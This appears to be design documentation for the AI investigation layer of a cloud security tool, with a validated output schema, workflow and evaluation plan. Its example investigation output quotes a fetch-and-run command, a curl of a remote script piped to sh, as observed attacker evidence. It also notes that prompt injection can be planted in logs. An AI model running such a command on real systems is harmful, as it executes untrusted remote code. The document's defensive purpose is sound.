# AI investigation layer

How the investigator stays grounded, cited and unable to act. Part of the [CloudShield documentation](../README.md#documentation).

Status markers: ✅ built and tested · 🧩 written as code, not deployed · 📐 designed only.

## AI investigation layer

> The LLM is an **analyst assistant**. It is not the primary detector, the policy authority or the executor. Detection rules and recorded telemetry establish the observations; the LLM makes them understandable.

### Four AI capabilities

| Capability | What it does | What it can never do |
|---|---|---|
| **AI Incident Investigator** | Reads a bounded evidence bundle, summarizes suspicious behavior, highlights connections, states competing interpretations, asks for missing evidence and cites event IDs | Invent events or assert certainty it doesn't have |
| **RAG Security Knowledge Assistant** | Retrieves approved runbooks and official procedures, keeping retrieved instructions separate from observed facts, with document citations | Treat retrieved text as instructions to itself |
| **AI Response Advisor** | Drafts containment options with likely blast radius, assumptions, prerequisites, risk flags and questions for the reviewer | Authorize or execute anything |
| **AI Incident Report Generator** | Produces a readable timeline, evidence index, verified actions, residual uncertainty, next steps and proposed runbook improvements | Mark an action as verified (only the verifier can) |

### AI technology choices

| Technology | Role | Status |
|---|---|---|
| **Amazon Bedrock** | Managed foundation-model inference in the same AWS account and IAM boundary | 🧩 client written; not yet run (needs AWS access) |
| **Offline baseline model** | Deterministic stand-in with no language model, so the path runs without AWS | ✅ used by tests, the demo and the eval harness |
| **RAG** | Retrieval of evidence and trusted reference text at query time | ✅ runbooks matched by event type and ATT&CK technique |
| **OpenSearch lexical → vector search** | Similar past cases and runbook passages | 📐 |
| **Bedrock Guardrails** | Prompt and response policies, sensitive-data filters | 🧩 the client accepts a guardrail ID; none configured [[R10]](references.md#references) |
| **LangGraph** | Multi-step workflow state with human interruption points | 📐 after the single-step flow is proven [[R11]](references.md#references) |
| **MCP** | Standard interface for *read-only* investigation tools | 📐 later, with explicit controls |
| **Local / open model** | Privacy or cost experiments | 📐 when justified by evaluation |

### The investigation contract

**Input:** case ID, curated event excerpts, normalized resource facts, source IDs, relevant runbook fragments and an explicit question.

**Output:** a strictly validated structure. The LLM can only choose actions from a **closed vocabulary**, so it has no way to emit a shell command or an IAM policy.

```python
class Fact(BaseModel):
    statement: str
    evidence_ids: list[str] = Field(min_length=1)  # every fact must cite at least one event


class Hypothesis(BaseModel):
    statement: str
    confidence: Literal["low", "medium", "high"]
    supporting_evidence: list[str]
    contradicting_evidence: list[str] = []


class ContainmentOption(BaseModel):
    action_type: Literal["k8s.pod.quarantine_label", "notify.slack", "case.escalate"]  # closed vocabulary
    target_entity_id: str
    rationale: str
    expected_blast_radius: str
    prerequisites: list[str]


class Investigation(BaseModel):
    synopsis: str = Field(max_length=600)
    observed_facts: list[Fact]
    hypotheses: list[Hypothesis]
    missing_evidence: list[str]
    containment_options: list[ContainmentOption]
    confidence_limits: str
```

**Post-validation (outside the model):** every cited `evidence_id` must exist in the bundle that was sent, and every `target_entity_id` must resolve to a known entity in the case. Output that fails validation is rejected and flagged, never shown as if it were trustworthy.

<details>
<summary><b>Example investigation output</b></summary>

```json
{
  "synopsis": "A shell in pod checkout-7d9f6c-x2k8p downloaded and piped a remote script from 198.51.100.23 about 30 seconds after an interactive kubectl exec session. GuardDuty independently flagged a newly executed binary in the same container.",
  "observed_facts": [
    { "statement": "kubectl exec into checkout-7d9f6c-x2k8p by principal dev-ci at 14:02:11Z", "evidence_ids": ["evt_01JD8Q2ZA1"] },
    { "statement": "sh -c 'curl -s http://198.51.100.23/x.sh | sh' executed in the checkout container", "evidence_ids": ["evt_01JD8Q3KX7R4M2"] },
    { "statement": "GuardDuty Execution:Runtime/NewBinaryExecuted for the same container ID", "evidence_ids": ["evt_01JD8Q4C9P"] }
  ],
  "hypotheses": [
    { "statement": "The dev-ci credential was misused for interactive access", "confidence": "medium",
      "supporting_evidence": ["evt_01JD8Q2ZA1"], "contradicting_evidence": [] }
  ],
  "missing_evidence": [
    "VPC Flow Logs for 198.51.100.23 after 14:03Z",
    "CloudTrail activity for the shop-checkout-pod role since 14:02Z"
  ],
  "containment_options": [
    { "action_type": "k8s.pod.quarantine_label", "target_entity_id": "k8s:pod/shop/checkout-7d9f6c-x2k8p",
      "rationale": "Cuts network access while preserving the pod for forensics",
      "expected_blast_radius": "checkout replica loses ingress and egress; 2 other replicas keep serving",
      "prerequisites": ["Confirm HPA keeps at least 2 healthy replicas"] }
  ],
  "confidence_limits": "No payload of x.sh is available; data exfiltration is neither observed nor ruled out."
}
```

</details>

### How an investigation runs

`POST /v1/cases/{id}/investigations` ([`workflow.py`](../services/investigator/workflow.py)):

1. The case's events are redacted and wrapped as untrusted evidence; runbooks whose front matter matches the case's event types or ATT&CK techniques are retrieved as citable passages ([`runbooks.py`](../services/investigator/runbooks.py)).
2. The model answers in the investigation schema. An answer citing an event that isn't in the case, or targeting an entity outside it, is rejected; the model gets one retry with the validator's messages only, then the run fails and the failure is audited.
3. A valid investigation is stored with its model ID, prompt version, runbooks used and number of attempts, and recorded in the audit log under the model's identity.
4. An analyst accepts or rejects it, once. Nothing in an investigation can start a response action.

**Models:** `CLOUDSHIELD_INVESTIGATOR=bedrock` uses Amazon Bedrock. `offline` is a deterministic baseline with no language model ([`offline.py`](../services/investigator/offline.py)): it restates the evidence as cited facts, so the whole path runs in tests, the demo and the lab without AWS. The eval harness scores it as the floor any real model has to beat.

### Why guardrails alone are not enough

Logs, alert descriptions and retrieved pages can carry **attacker-controlled text**. OWASP lists prompt injection and excessive agency among the top LLM application risks [[R12]](references.md#references). CloudShield treats every event field and every RAG passage as untrusted, and it enforces access and actions **outside the model**. Bedrock Guardrails adds protection but never replaces independent authorization [[R10]](references.md#references).

### AI evaluation and observability

- A fixed set of labeled incidents with ground-truth artifacts and expected answers.
- Scoring for factual grounding, incorrect references, missing evidence, reported uncertainty and unsafe suggestions.
- Adversarial text in event fields and retrieved documents is tested **before** any increase in agent autonomy.
- Every call logs the model ID and configuration, prompt version, tool calls, retrieved document IDs, response version and the analyst's review decision (with sensitive material protected).
- Token usage, latency, model errors and estimated inference cost are monitored, with hard cost limits.
- The knowledge base is access-controlled, so public runbooks and confidential incident data are never retrieved indiscriminately.
